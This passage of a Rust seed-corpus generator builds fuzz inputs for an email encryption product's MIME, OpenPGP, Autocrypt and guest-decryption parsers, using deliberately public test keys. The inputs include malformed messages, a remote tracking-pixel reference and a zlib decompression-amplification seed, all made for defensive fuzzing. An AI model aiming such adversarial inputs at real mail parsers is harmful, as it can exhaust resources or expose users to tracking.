//! Seed-corpus generator for the Sealbox fuzz targets (gate G13). Stable toolchain:
//!
//! ```text
//! cargo run --manifest-path fuzz/seedgen/Cargo.toml --release --target-dir target/fuzz-seedgen
//! ```
//!
//! * `fuzz/seeds/keys/` — the fuzz TEST identities (v4 + v6) and the fuzz peer. Generated on
//!   the first run only; afterwards the committed files are reused (all six present → reuse,
//!   none present → generate, anything else → error), so the committed seed messages stay
//!   decryptable by the harness, which loads the same files (`fuzz/src/lib.rs`).
//! * `fuzz/seeds/<target>/` — valid inputs for every harness, rewritten on each run. The
//!   ciphertext seeds use fresh randomness, so a re-run changes their bytes, not their meaning.
//!
//! Every seed is produced through the same public APIs the product uses (sealbox-mail's MIME
//! builders, sealbox-crypto's encrypt/sign/Autocrypt/guest functions), plus rPGP directly for
//! packet shapes the product never emits but peers do (anonymous recipients, partial lengths,
//! ZIP/BZip2 compression, text-mode signatures, several signatures/password packets).
//! The `html_sanitize` seeds are hand-written HTML documents (a newsletter, XSS vectors, remote
//! images, malformed markup), each prefixed with the harness's mode byte (`0` = remote content
//! blocked, `1` = allowed).
//! The `autodiscover_xml` seeds are real Mozilla ISPDB documents (`samples/autoconfig/`,
//! fetched 2026-10-29 from `https://autoconfig.thunderbird.net/v1.1/<domain>`) plus
//! hand-written edge cases.

// Only part of the shared parameters is needed to *produce* seeds.
#[allow(dead_code)]
#[path = "../../src/params.rs"]
mod params;
// The harness's fixtures and wrapped-mode containers, for `--check`.
#[path = "../../src/fixtures.rs"]
mod fixtures;

use std::fs;
use std::io::Cursor;
use std::path::{Path, PathBuf};

use anyhow::{bail, Context, Result};
use pgp::composed::{
    ArmorOptions, CleartextSignedMessage, Deserializable, MessageBuilder, SignedSecretKey,
};
use pgp::crypto::aead::{AeadAlgorithm, ChunkSize};
use pgp::crypto::hash::HashAlgorithm;
use pgp::crypto::sym::SymmetricKeyAlgorithm;
use pgp::types::{CompressionAlgorithm, Password, StringToKey};
use sealbox_crypto::{
    encrypt_and_sign_armored, encrypt_and_sign_with, guest_encrypt, guest_encrypt_with,
    minimal_key_for_autocrypt, setup_message_create, sign_detached, sign_detached_binary,
    AutocryptGossip, AutocryptHeader, EncryptOptions, GuestProfile, Identity, KeyGenOptions,
    KeyVersion, PreferEncrypt, PublicKey,
};
use sealbox_mail::mime::{
    autocrypt_gossip_header_value, autocrypt_header_value, autocrypt_keydata_b64,
    build_pgp_mime_encrypted, build_pgp_mime_signed, build_plain, prepare_signed_part,
    render_inner_for_encryption, Attachment, InnerOptions, Mailbox, MessageDraft, OuterHeaders,
};

use params::*;

/// A fixed `Date:` (2025-10-29T00:00:00Z) so that MIME seeds are stable across runs.
const SEED_DATE: i64 = 1_761_696_000;
const KEY_COMMENT: &str =
    "Comment: Sealbox FUZZ TEST KEY (fuzz/seeds/keys, gate G13) - public on purpose";

struct Keys {
    identity: Identity,
    identity_v6: Identity,
    peer: Identity,
    /// rPGP views of the same secret keys, for packet shapes sealbox-crypto does not emit.
    peer_raw: SignedSecretKey,
    identity_raw: SignedSecretKey,
}

fn main() -> Result<()> {
    let fuzz_dir = Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .context("seedgen lives in fuzz/seedgen")?
        .to_path_buf();
    let seeds = fuzz_dir.join("seeds");
    if std::env::args().any(|a| a == "--check") {
        // Verify only: never (re)generates keys or seeds.
        return check::run(&seeds);
    }
    let keys = load_or_create_keys(&seeds.join("keys"))?;

    let mut total = 0;
    total += mime_seeds(&seeds.join("mime_parse"), &keys)?;
    total += pgp_seeds(&seeds.join("pgp_decrypt"), &keys)?;
    total += autocrypt_seeds(&seeds.join("autocrypt_header"), &keys)?;
    total += guest_seeds(&seeds.join("guest_decrypt"), &keys)?;
    total += autoconfig_seeds(
        &seeds.join("autodiscover_xml"),
        &fuzz_dir.join("seedgen/samples/autoconfig"),
    )?;
    total += html_seeds(&seeds.join("html_sanitize"))?;
    println!("seedgen: wrote {total} seeds under {}", seeds.display());
    check::run(&seeds)
}

// ------------------------------------------------------------------------------------------
// keys

fn load_or_create_keys(dir: &Path) -> Result<Keys> {
    fs::create_dir_all(dir)?;
    let files = [
        IDENTITY_SECRET_FILE,
        IDENTITY_PUBLIC_FILE,
        IDENTITY_V6_SECRET_FILE,
        IDENTITY_V6_PUBLIC_FILE,
        PEER_SECRET_FILE,
        PEER_PUBLIC_FILE,
    ];
    let present = files.iter().filter(|f| dir.join(f).exists()).count();
    if present == 0 {
        let v6 = KeyGenOptions {
            version: KeyVersion::V6,
            advertise_seipd_v2: true,
            ..KeyGenOptions::default()
        };
        let generated = [
            (
                Identity::generate("Sealbox Fuzz Identity", IDENTITY_EMAIL)?,
                IDENTITY_SECRET_FILE,
                IDENTITY_PUBLIC_FILE,
            ),
            (
                Identity::generate_with("Sealbox Fuzz Identity v6", IDENTITY_V6_EMAIL, v6)?,
                IDENTITY_V6_SECRET_FILE,
                IDENTITY_V6_PUBLIC_FILE,
            ),
            (
                Identity::generate("Sealbox Fuzz Peer", PEER_EMAIL)?,
                PEER_SECRET_FILE,
                PEER_PUBLIC_FILE,
            ),
        ];
        for (id, sec, public) in generated {
            write(
                &dir.join(sec),
                with_comment(&id.to_armored_secret(None)?).as_bytes(),
            )?;
            write(
                &dir.join(public),
                with_comment(&id.public().to_armored()?).as_bytes(),
            )?;
        }
        println!(
            "seedgen: generated NEW fuzz identities in {}",
            dir.display()
        );
    } else if present != files.len() {
        bail!(
            "{}: {present} of {} key files present — restore them from git (or delete all six \
             to regenerate; every seed is then regenerated as well)",
            dir.display(),
            files.len()
        );
    } else {
        println!("seedgen: reusing the committed fuzz identities");
    }
    let read = |f: &str| -> Result<String> {
        fs::read_to_string(dir.join(f)).with_context(|| format!("reading {f}"))
    };
    let identity = Identity::from_armored_secret(&read(IDENTITY_SECRET_FILE)?, None)?;
    let identity_v6 = Identity::from_armored_secret(&read(IDENTITY_V6_SECRET_FILE)?, None)?;
    let peer = Identity::from_armored_secret(&read(PEER_SECRET_FILE)?, None)?;
    // The public files must match the secret ones.
    for (sec, public) in [
        (&identity, IDENTITY_PUBLIC_FILE),
        (&identity_v6, IDENTITY_V6_PUBLIC_FILE),
        (&peer, PEER_PUBLIC_FILE),
    ] {
        let pk = PublicKey::from_armored(&read(public)?)?;
        if pk.fingerprint() != sec.fingerprint() {
            bail!("{public} does not belong to its secret key");
        }
    }
    let raw = |f: &str| -> Result<SignedSecretKey> {
        Ok(SignedSecretKey::from_armor_single(Cursor::new(read(f)?))?.0)
    };
    Ok(Keys {
        peer_raw: raw(PEER_SECRET_FILE)?,
        identity_raw: raw(IDENTITY_SECRET_FILE)?,
        identity,
        identity_v6,
        peer,
    })
}

/// Insert a `Comment:` armor header right after the BEGIN line (armor headers precede the
/// blank line that starts the base64 body, so this works with or without existing headers).
fn with_comment(armored: &str) -> String {
    match armored.split_once('\n') {
        Some((begin, rest)) => format!("{}\n{KEY_COMMENT}\n{rest}", begin.trim_end_matches('\r')),
        None => armored.to_owned(),
    }
}

fn write(path: &Path, bytes: &[u8]) -> Result<()> {
    fs::write(path, bytes).with_context(|| format!("writing {}", path.display()))
}

/// (Re)create `dir` with exactly `seeds` in it.
fn write_seeds(dir: &Path, seeds: &[(String, Vec<u8>)]) -> Result<usize> {
    if dir.exists() {
        for e in fs::read_dir(dir)? {
            let p = e?.path();
            if p.is_file() {
                fs::remove_file(&p)?;
            }
        }
    }
    fs::create_dir_all(dir)?;
    for (name, bytes) in seeds {
        write(&dir.join(name), bytes)?;
    }
    println!("seedgen: {:>3} seeds in {}", seeds.len(), dir.display());
    Ok(seeds.len())
}

fn moded(mode: u8, payload: &[u8]) -> Vec<u8> {
    let mut v = Vec::with_capacity(payload.len() + 1);
    v.push(mode);
    v.extend_from_slice(payload);
    v
}

fn ephemeral(name: &str, email: &str) -> Result<Identity> {
    Ok(Identity::generate(name, email)?)
}

// ------------------------------------------------------------------------------------------
// mime_parse

fn mailbox(name: &str, addr: &str) -> Mailbox {
    Mailbox::named(name, addr)
}

fn draft(subject: &str, text: &str, id: &str) -> MessageDraft {
    let mut d = MessageDraft::new(
        mailbox("Sealbox Fuzz Peer", PEER_EMAIL),
        vec![mailbox("Sealbox Fuzz Identity", IDENTITY_EMAIL)],
        subject,
        text,
    );
    d.message_id = format!("{id}@sealbox.test");
    d.date = SEED_DATE;
    d
}

fn mime_seeds(dir: &Path, k: &Keys) -> Result<usize> {
    let mut seeds: Vec<(String, Vec<u8>)> = Vec::new();
    let peer_ac = autocrypt_header_value(
        PEER_EMAIL,
        true,
        &autocrypt_keydata_b64(&minimal_key_for_autocrypt(&k.peer)?),
    );

    // 1. plain text with a non-ASCII subject (RFC 2047 on the wire) and an Autocrypt header
    let mut d = draft("Grüße — plain ✓", "Hello from the fuzz peer.\r\n", "plain");
    d.extra_headers.push(("Autocrypt".into(), peer_ac.clone()));
    seeds.push(("plain-autocrypt.eml".into(), build_plain(&d)?));

    // 2. text + HTML + an attachment + an inline image, Cc, threading headers
    let mut d = draft("Re: files", "see attached\r\n", "attachments");
    d.cc = vec![mailbox("Carol", "carol@sealbox.test")];
    d.html_body = Some("<p>see <b>attached</b> <img src=\"cid:logo@seed\"></p>".into());
    d.in_reply_to = Some("parent@sealbox.test".into());
    d.references = vec!["root@sealbox.test".into(), "parent@sealbox.test".into()];
    d.attachments.push(Attachment::new(
        "report.pdf",
        "application/pdf",
        b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n".to_vec(),
    ));
    let mut logo = Attachment::new(
        "logo.png",
        "image/png",
        b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR".to_vec(),
    );
    logo.content_id = Some("logo@seed".into());
    d.attachments.push(logo);
    seeds.push(("plain-html-attachments.eml".into(), build_plain(&d)?));

    // 3. PGP/MIME encrypted + signed, protected headers, gossip, legacy display part —
    //    exactly the send pipeline of sealbox-core (send.rs)
    let mut d = draft("Protected subject", "the secret body\r\n", "encrypted");
    d.cc = vec![mailbox("Carol", "carol@sealbox.test")];
    d.extra_headers.push(("Autocrypt".into(), peer_ac.clone()));
    let gossip = autocrypt_gossip_header_value(
        IDENTITY_EMAIL,
        &autocrypt_keydata_b64(&minimal_key_for_autocrypt(&k.identity)?),
    );
    let inner = render_inner_for_encryption(
        &d,
        &InnerOptions {
            gossip_headers: vec![gossip.clone()],
            legacy_display: true,
        },
    )?;
    seeds.push(("inner-protected-headers.eml".into(), inner.clone()));
    let armored = encrypt_and_sign_armored(
        &inner,
        &[&k.identity.public(), &k.peer.public()],
        Some(&k.peer),
    )?;
    let mut outer = OuterHeaders::for_protected(&d);
    outer.extra_headers = d.extra_headers.clone();
    let encrypted = build_pgp_mime_encrypted(&outer, &armored)?;
    seeds.push(("pgp-mime-encrypted.eml".into(), encrypted.clone()));

    // 4. the same entity wrapped in multipart/mixed by a gateway that appends a footer
    seeds.push((
        "pgp-mime-encrypted-gateway-wrapped.eml".into(),
        gateway_wrap(&encrypted),
    ));

    // 5. PGP/MIME to the v6 identity (SEIPDv2 / OCB, v6 PKESK)
    let d6 = draft("v6", "rfc 9580 body\r\n", "encrypted-v6");
    let inner6 = render_inner_for_encryption(&d6, &InnerOptions::default())?;
    let armored6 =
        encrypt_and_sign_armored(&inner6, &[&k.identity_v6.public()], Some(&k.identity_v6))?;
    seeds.push((
        "pgp-mime-encrypted-v6.eml".into(),
        build_pgp_mime_encrypted(&OuterHeaders::for_protected(&d6), &armored6)?,
    ));

    // 6. PGP/MIME signed (RFC 3156 multipart/signed, detached signature by the peer)
    let mut d = draft("Signed", "signed body\r\n", "signed");
    d.extra_headers.push(("Autocrypt".into(), peer_ac.clone()));
    let part = prepare_signed_part(&d)?;
    let sig = sign_detached(&part, &k.peer)?;
    let mut outer = OuterHeaders::from_draft(&d);
    outer.extra_headers = d.extra_headers.clone();
    seeds.push((
        "pgp-mime-signed.eml".into(),
        build_pgp_mime_signed(&outer, &part, &sig, "pgp-sha256")?,
    ));

    // 7. inline PGP (encrypted) and a clear-signed text body
    let inline = encrypt_and_sign_armored(
        b"inline pgp body\r\n",
        &[&k.identity.public()],
        Some(&k.peer),
    )?;
    let d = draft(
        "inline",
        &format!("Hi,\r\n\r\n{inline}\r\n-- \r\nsig\r\n"),
        "inline",
    );
    seeds.push(("inline-pgp-encrypted.eml".into(), build_plain(&d)?));
    let clear = CleartextSignedMessage::sign(
        rand::thread_rng(),
        "clear-signed text\r\nsecond line\r\n",
        &k.peer_raw.primary_key,
        &Password::empty(),
    )?
    .to_armored_string(ArmorOptions::default())?;
    let d = draft("clearsigned", &clear, "clearsigned");
    seeds.push(("inline-pgp-clearsigned.eml".into(), build_plain(&d)?));

    // 8. hand-written shapes the builders never emit
    for (name, text) in HANDWRITTEN_MIME {
        seeds.push(((*name).into(), text.as_bytes().to_vec()));
    }
    write_seeds(dir, &seeds)
}

/// Put an RFC 822 message's body entity inside `multipart/mixed` with a footer part.
fn gateway_wrap(message: &[u8]) -> Vec<u8> {
    let text = String::from_utf8_lossy(message);
    let (headers, body) = text.split_once("\r\n\r\n").unwrap_or((&text, ""));
    let mut envelope = String::new();
    let mut content_type = String::new();
    let mut in_ct = false;
    for line in headers.split("\r\n") {
        let continuation = line.starts_with(' ') || line.starts_with('\t');
        if line.to_ascii_lowercase().starts_with("content-type:") {
            in_ct = true;
            content_type.push_str(line);
            content_type.push_str("\r\n");
        } else if continuation && in_ct {
            content_type.push_str(line);
            content_type.push_str("\r\n");
        } else {
            in_ct = false;
            if !line.to_ascii_lowercase().starts_with("mime-version:") {
                envelope.push_str(line);
                envelope.push_str("\r\n");
            }
        }
    }
    format!(
        "{envelope}MIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"gw-outer\"\r\n\r\n\
         --gw-outer\r\n{content_type}\r\n{body}\r\n--gw-outer\r\n\
         Content-Type: text/plain; charset=us-ascii\r\n\r\n\
         This message was scanned by the gateway.\r\n--gw-outer--\r\n"
    )
    .into_bytes()
}

const HANDWRITTEN_MIME: &[(&str, &str)] = &[
    (
        "encoded-words-qp-latin1.eml",
        "From: =?ISO-8859-1?Q?Andr=E9_Pirard?= <pirard@sealbox.test>\r\n\
         To: =?UTF-8?B?w4lsb8Ovc2U=?= <eloise@sealbox.test>, \"Doe, John\" <john@sealbox.test>\r\n\
         Subject: =?UTF-8?Q?caf=C3=A9_?= =?ISO-8859-1?B?SWYgeW91IGNhbiByZWFkIHRoaXMgeW8=?=\r\n\
         Date: Wed, 29 Oct 2025 10:00:00 +0100\r\n\
         Message-ID: <qp@sealbox.test>\r\n\
         MIME-Version: 1.0\r\n\
         Content-Type: text/plain; charset=ISO-8859-1\r\n\
         Content-Transfer-Encoding: quoted-printable\r\n\r\n\
         Caf=E9 cr=E8me with a soft=\r\n line break and =3D signs.\r\n",
    ),
    (
        "nested-alternative-rfc822.eml",
        "From: a@sealbox.test\r\nTo: b@sealbox.test\r\nSubject: nested\r\nMIME-Version: 1.0\r\n\
         Content-Type: multipart/mixed; boundary=\"m1\"\r\n\r\npreamble text\r\n--m1\r\n\
         Content-Type: multipart/alternative; boundary=\"a1\"\r\n\r\n--a1\r\n\
         Content-Type: text/plain; charset=utf-8\r\nContent-Transfer-Encoding: base64\r\n\r\n\
         aGVsbG8gd29ybGQK\r\n--a1\r\nContent-Type: text/html; charset=utf-8\r\n\r\n\
         <html><body><p>hello <img src=\"https://tracker.example/p.gif\"></p></body></html>\r\n\
         --a1--\r\n--m1\r\nContent-Type: message/rfc822\r\nContent-Disposition: attachment; \
         filename=\"fwd.eml\"\r\n\r\nFrom: c@sealbox.test\r\nSubject: inner\r\n\
         Content-Type: multipart/signed; protocol=\"application/pgp-signature\"; \
         micalg=pgp-sha256; boundary=\"s1\"\r\n\r\n--s1\r\nContent-Type: text/plain\r\n\r\n\
         inner signed\r\n--s1\r\nContent-Type: application/pgp-signature\r\n\r\n\
         -----BEGIN PGP SIGNATURE-----\r\n\r\nAAAA\r\n-----END PGP SIGNATURE-----\r\n--s1--\r\n\
         --m1\r\nContent-Type: application/octet-stream; name*=UTF-8''r%C3%A9sum%C3%A9.bin\r\n\
         Content-Disposition: attachment; filename*0=\"long\"; filename*1=\"name.bin\"\r\n\
         Content-Transfer-Encoding: base64\r\n\r\nAAECAwQFBgc=\r\n--m1--\r\nepilogue\r\n",
    ),
    (
        "bounce-multipart-report.eml",
        "From: MAILER-DAEMON@sealbox.test\r\nTo: a@sealbox.test\r\nSubject: Undelivered\r\n\
         Autocrypt: addr=MAILER-DAEMON@sealbox.test; keydata=AAAA\r\nMIME-Version: 1.0\r\n\
         Content-Type: multipart/report; report-type=delivery-status; boundary=\"r\"\r\n\r\n\
         --r\r\nContent-Type: text/plain\r\n\r\nDelivery failed.\r\n--r\r\n\
         Content-Type: message/delivery-status\r\n\r\nReporting-MTA: dns; mx.sealbox.test\r\n\r\n\
         Final-Recipient: rfc822; x@sealbox.test\r\nAction: failed\r\nStatus: 5.1.1\r\n\
         --r\r\nContent-Type: text/rfc822-headers\r\n\r\nFrom: a@sealbox.test\r\n\
         Subject: original\r\n--r--\r\n",
    ),
    (
        "lf-only-signed.eml",
        "From: a@sealbox.test\nTo: b@sealbox.test\nSubject: lf\nMIME-Version: 1.0\n\
         Content-Type: multipart/signed; micalg=pgp-sha512; boundary=lfb\n\n--lfb\n\
         Content-Type: text/plain\n\nlf only body\n--lfb\nContent-Type: application/pgp-signature\n\n\
         -----BEGIN PGP SIGNATURE-----\n\niQ==\n-----END PGP SIGNATURE-----\n--lfb--\n",
    ),
    (
        "encrypted-unterminated-padding.eml",
        "From: a@sealbox.test\r\nTo: b@sealbox.test\r\nSubject: ...\r\nMIME-Version: 1.0\r\n\
         Content-Type: multipart/encrypted;\r\n protocol=\"application/pgp-encrypted\";\r\n\
         \tboundary=\"enc  b\"\r\n\r\n--enc  b \t\r\nContent-Type: application/pgp-encrypted\r\n\r\n\
         Version: 1\r\n--enc  b\r\nContent-Type: application/octet-stream\r\n\r\n\
         -----BEGIN PGP MESSAGE-----\r\n\r\nhQ==\r\n-----END PGP MESSAGE-----\r\n",
    ),
    (
        "encrypted-other-protocol.eml",
        "Content-Type: multipart/encrypted; protocol=\"application/pkcs7-mime\"; boundary=x\r\n\r\n\
         --x\r\nContent-Type: application/pkcs7-mime\r\n\r\nMIAGCSqGSIb3DQEHA6CAMIACAQAx\r\n--x--\r\n",
    ),
    (
        "headers-only-folded.eml",
        "Received: from mx.sealbox.test\r\n\tby mx2.sealbox.test; Wed, 29 Oct 2025 10:00:00 +0000\r\n\
         From: \"Very, Long \\\"Quoted\\\" Name\" <long@sealbox.test>\r\n\
         To: undisclosed-recipients:;\r\nReply-To: group: a@sealbox.test, b@sealbox.test;\r\n\
         Subject: a very long subject line that keeps going and going so that it has to be\r\n \
         folded onto a continuation line\r\n\
         References: <a@x> <b@x>\r\n <c@x>\r\nIn-Reply-To: <c@x>\r\n\
         Autocrypt-Gossip: addr=g@sealbox.test; keydata=AAAA\r\nDate: not a date\r\n",
    ),
];

// ------------------------------------------------------------------------------------------
// pgp_decrypt

/// Plaintext packet stream (what sits inside the SEIPD container): literal data, optionally
/// compressed and/or signed, built with rPGP without encryption.
fn inner_stream(
    data: &[u8],
    signers: &[&SignedSecretKey],
    compression: Option<CompressionAlgorithm>,
    text_mode: bool,
    partial: Option<u32>,
) -> Result<Vec<u8>> {
    let mut b = MessageBuilder::from_bytes("", data.to_vec());
    if let Some(c) = compression {
        b.compression(c);
    }
    if text_mode {
        b.sign_text();
    }
    if let Some(chunk) = partial {
        b.partial_chunk_size(chunk)?;
    }
    for s in signers {
        b.sign(&s.primary_key, Password::empty(), HashAlgorithm::Sha256);
    }
    Ok(b.to_vec(rand::thread_rng())?)
}

fn pgp_seeds(dir: &Path, k: &Keys) -> Result<usize> {
    use params::pgp_mode::*;
    let mut seeds: Vec<(String, Vec<u8>)> = Vec::new();
    let body = b"Content-Type: text/plain; charset=utf-8\r\n\r\nhello fuzz identity\r\n";
    let me = k.identity.public();
    let me6 = k.identity_v6.public();
    let peer = k.peer.public();
    let opts = |compress| EncryptOptions {
        compress,
        prefer_seipd_v2: true,
    };

    // RAW: complete messages as the product and its peers produce them
    seeds.push((
        "raw-v4-signed.pgp".into(),
        moded(
            RAW,
            &encrypt_and_sign_with(body, &[&me, &peer], Some(&k.peer), opts(false), false)?,
        ),
    ));
    seeds.push((
        "raw-v4-signed-armored.asc".into(),
        moded(
            RAW,
            &encrypt_and_sign_with(body, &[&me], Some(&k.peer), opts(false), true)?,
        ),
    ));
    seeds.push((
        "raw-v4-unsigned-zlib.pgp".into(),
        moded(
            RAW,
            &encrypt_and_sign_with(body, &[&me], None, opts(true), false)?,
        ),
    ));
    seeds.push((
        "raw-v6-seipdv2-signed-v6.pgp".into(),
        moded(
            RAW,
            &encrypt_and_sign_with(body, &[&me6], Some(&k.identity_v6), opts(false), false)?,
        ),
    ));
    seeds.push((
        "raw-v4-and-v6-recipients-signed.pgp".into(),
        moded(
            RAW,
            &encrypt_and_sign_with(body, &[&me, &me6], Some(&k.peer), opts(false), false)?,
        ),
    ));
    let stranger = ephemeral("Stranger", "stranger@sealbox.test")?;
    seeds.push((
        "raw-signed-by-unknown-key.pgp".into(),
        moded(
            RAW,
            &encrypt_and_sign_with(body, &[&me], Some(&stranger), opts(false), false)?,
        ),
    ));
    seeds.push((
        "raw-not-for-us.pgp".into(),
        moded(
            RAW,
            &encrypt_and_sign_with(
                body,
                &[&stranger.public()],
                Some(&k.peer),
                opts(false),
                false,
            )?,
        ),
    ));
    {
        // anonymous (wildcard key id) recipient + partial body lengths, as some peers send
        let cert = k.identity_raw.to_public_key();
        let enc = &cert.public_subkeys[0].key;
        let mut rng = rand::thread_rng();
        let big: Vec<u8> = body.iter().copied().cycle().take(3000).collect();
        let mut b =
            MessageBuilder::from_bytes("", big).seipd_v1(&mut rng, SymmetricKeyAlgorithm::AES256);
        b.encrypt_to_key_anonymous(&mut rng, enc)?;
        b.partial_chunk_size(512)?;
        b.sign(
            &k.peer_raw.primary_key,
            Password::empty(),
            HashAlgorithm::Sha512,
        );
        seeds.push((
            "raw-anonymous-partial-signed.pgp".into(),
            moded(RAW, &b.to_vec(&mut rng)?),
        ));
    }
    seeds.push((
        "raw-signed-not-encrypted.pgp".into(),
        moded(RAW, &inner_stream(body, &[&k.peer_raw], None, false, None)?),
    ));

    // WRAP_V1 / WRAP_V2: plaintext packet streams the harness encrypts itself
    let streams: Vec<(&str, Vec<u8>)> = vec![
        ("literal", inner_stream(body, &[], None, false, None)?),
        (
            "signed-peer",
            inner_stream(body, &[&k.peer_raw], None, false, None)?,
        ),
        (
            "signed-peer-and-identity",
            inner_stream(body, &[&k.peer_raw, &k.identity_raw], None, false, None)?,
        ),
        (
            "signed-unknown",
            inner_stream(
                body,
                &[&SignedSecretKey::from_armor_single(Cursor::new(
                    stranger.to_armored_secret(None)?,
                ))?
                .0],
                None,
                false,
                None,
            )?,
        ),
        (
            "zlib-signed",
            inner_stream(
                body,
                &[&k.peer_raw],
                Some(CompressionAlgorithm::ZLIB),
                false,
                None,
            )?,
        ),
        (
            "zip-signed",
            inner_stream(
                body,
                &[&k.peer_raw],
                Some(CompressionAlgorithm::ZIP),
                false,
                None,
            )?,
        ),
        (
            "bzip2-signed",
            inner_stream(
                body,
                &[&k.peer_raw],
                Some(CompressionAlgorithm::BZip2),
                false,
                None,
            )?,
        ),
        (
            "text-mode-signed",
            inner_stream(
                b"line one\r\nline two\r\n",
                &[&k.peer_raw],
                None,
                true,
                None,
            )?,
        ),
        (
            "partial-lengths-signed",
            inner_stream(&[b'x'; 2000], &[&k.peer_raw], None, false, Some(512))?,
        ),
        (
            // 1 MiB of zeros in ~1 KiB: decompression amplification within the read limit
            "zlib-amplification-1mib",
            inner_stream(
                &vec![0u8; 1 << 20],
                &[],
                Some(CompressionAlgorithm::ZLIB),
                false,
                None,
            )?,
        ),
    ];
    for (name, s) in &streams {
        seeds.push((format!("wrap-v1-{name}.bin"), moded(WRAP_V1, s)));
    }
    for (name, s) in streams.iter().filter(|(n, _)| {
        matches!(
            *n,
            "literal" | "signed-peer" | "zlib-signed" | "text-mode-signed"
        )
    }) {
        seeds.push((format!("wrap-v2-{name}.bin"), moded(WRAP_V2, s)));
    }

    // DETACHED: signatures over DETACHED_SIGNED_DATA (the multipart/signed verify path)
    seeds.push((
        "detached-peer.asc".into(),
        moded(
            DETACHED,
            sign_detached(DETACHED_SIGNED_DATA, &k.peer)?.as_bytes(),
        ),
    ));
    seeds.push((
        "detached-peer.bin".into(),
        moded(
            DETACHED,
            &sign_detached_binary(DETACHED_SIGNED_DATA, &k.peer)?,
        ),
    ));
    let mut two = sign_detached_binary(DETACHED_SIGNED_DATA, &k.peer)?;
    two.extend(sign_detached_binary(DETACHED_SIGNED_DATA, &k.identity)?);
    seeds.push(("detached-two-signers.bin".into(), moded(DETACHED, &two)));
    seeds.push((
        "detached-v6.asc".into(),
        moded(
            DETACHED,
            sign_detached(DETACHED_SIGNED_DATA, &k.identity_v6)?.as_bytes(),
        ),
    ));
    seeds.push((
        "detached-unknown.bin".into(),
        moded(
            DETACHED,
            &sign_detached_binary(DETACHED_SIGNED_DATA, &stranger)?,
        ),
    ));
    write_seeds(dir, &seeds)
}

// ------------------------------------------------------------------------------------------
// autocrypt_header

fn autocrypt_seeds(dir: &Path, k: &Keys) -> Result<usize> {
    use params::autocrypt_mode::*;
    let mut seeds: Vec<(String, Vec<u8>)> = Vec::new();
    let peer_h = AutocryptHeader::for_identity(&k.peer, None, PreferEncrypt::Mutual)?;
    seeds.push((
        "header-peer-folded.txt".into(),
        moded(HEADER, peer_h.render().as_bytes()),
    ));
    seeds.push((
        "header-peer-unfolded.txt".into(),
        moded(HEADER, peer_h.render_unfolded().as_bytes()),
    ));
    let nopref = AutocryptHeader::for_identity(&k.identity, None, PreferEncrypt::NoPreference)?;
    seeds.push((
        "header-identity-nopref.txt".into(),
        moded(HEADER, nopref.render().as_bytes()),
    ));
    let v6 = AutocryptHeader::for_identity(&k.identity_v6, None, PreferEncrypt::Mutual)?;
    seeds.push((
        "header-v6.txt".into(),
        moded(HEADER, v6.render().as_bytes()),
    ));
    let b64 = autocrypt_keydata_b64(&minimal_key_for_autocrypt(&k.peer)?);
    seeds.push((
        "header-mail-crate-noncritical.txt".into(),
        moded(
            HEADER,
            format!(
                "_x-extra=1; {}",
                autocrypt_header_value(PEER_EMAIL, true, &b64)
            )
            .as_bytes(),
        ),
    ));
    let gossip = AutocryptGossip::new(IDENTITY_EMAIL, &k.identity.public())?;
    seeds.push((
        "gossip-identity.txt".into(),
        moded(GOSSIP, gossip.render().as_bytes()),
    ));
    seeds.push((
        "gossip-mail-crate.txt".into(),
        moded(
            GOSSIP,
            autocrypt_gossip_header_value(PEER_EMAIL, &b64).as_bytes(),
        ),
    ));
    seeds.push((
        "keydata-peer-minimal.bin".into(),
        moded(KEYDATA, &minimal_key_for_autocrypt(&k.peer)?),
    ));
    seeds.push((
        "keydata-identity-full.asc".into(),
        moded(KEYDATA, k.identity.public().to_armored()?.as_bytes()),
    ));
    seeds.push((
        "keydata-v6.bin".into(),
        moded(KEYDATA, &k.identity_v6.public().to_bytes()?),
    ));
    seeds.push((
        "keydata-peer-secret.bin".into(),
        moded(KEYDATA, &k.peer.to_secret_bytes()?),
    ));
    write_seeds(dir, &seeds)
}

// ------------------------------------------------------------------------------------------
// guest_decrypt

/// A symmetric envelope built with rPGP directly, with a cheap S2K so that the fuzzer spends
/// its time in parsing rather than in key derivation.
fn cheap_envelope(
    data: &[u8],
    v2: bool,
    compression: Option<CompressionAlgorithm>,
    extra_wrong_password: bool,
) -> Result<Vec<u8>> {
    let mut rng = rand::thread_rng();
    let pw = Password::from(GUEST_PASSPHRASE);
    let wrong = Password::from("not the passphrase");
    let s2k = || StringToKey::new_iterated(rand::thread_rng(), HashAlgorithm::Sha256, 0);
    if v2 {
        let mut b = MessageBuilder::from_bytes("", data.to_vec()).seipd_v2(
            &mut rng,
            SymmetricKeyAlgorithm::AES256,
            AeadAlgorithm::Ocb,
            ChunkSize::default(),
        );
        if let Some(c) = compression {
            b.compression(c);
        }
        if extra_wrong_password {
            b.encrypt_with_password(&mut rng, s2k(), &wrong)?;
        }
        b.encrypt_with_password(&mut rng, s2k(), &pw)?;
        Ok(b.to_vec(&mut rng)?)
    } else {
        let mut b = MessageBuilder::from_bytes("", data.to_vec())
            .seipd_v1(&mut rng, SymmetricKeyAlgorithm::AES256);
        if let Some(c) = compression {
            b.compression(c);
        }
        if extra_wrong_password {
            b.encrypt_with_password(s2k(), &wrong)?;
        }
        b.encrypt_with_password(s2k(), &pw)?;
        Ok(b.to_vec(&mut rng)?)
    }
}

fn guest_seeds(dir: &Path, k: &Keys) -> Result<usize> {
    use params::guest_mode::*;
    let mut seeds: Vec<(String, Vec<u8>)> = Vec::new();
    let body = b"Content-Type: text/plain; charset=utf-8\r\n\r\nhello guest\r\n";

    // RAW: the two product profiles (expensive S2K, as shipped) plus cheap variants
    seeds.push((
        "raw-interop-profile.asc".into(),
        moded(RAW, guest_encrypt(body, GUEST_PASSPHRASE)?.as_bytes()),
    ));
    seeds.push((
        "raw-rfc9580-profile.asc".into(),
        moded(
            RAW,
            guest_encrypt_with(body, GUEST_PASSPHRASE, GuestProfile::Rfc9580)?.as_bytes(),
        ),
    ));
    seeds.push((
        "raw-cheap-v1.pgp".into(),
        moded(RAW, &cheap_envelope(body, false, None, false)?),
    ));
    seeds.push((
        "raw-cheap-v2.pgp".into(),
        moded(RAW, &cheap_envelope(body, true, None, false)?),
    ));
    seeds.push((
        "raw-cheap-v1-zlib-two-skesk.pgp".into(),
        moded(
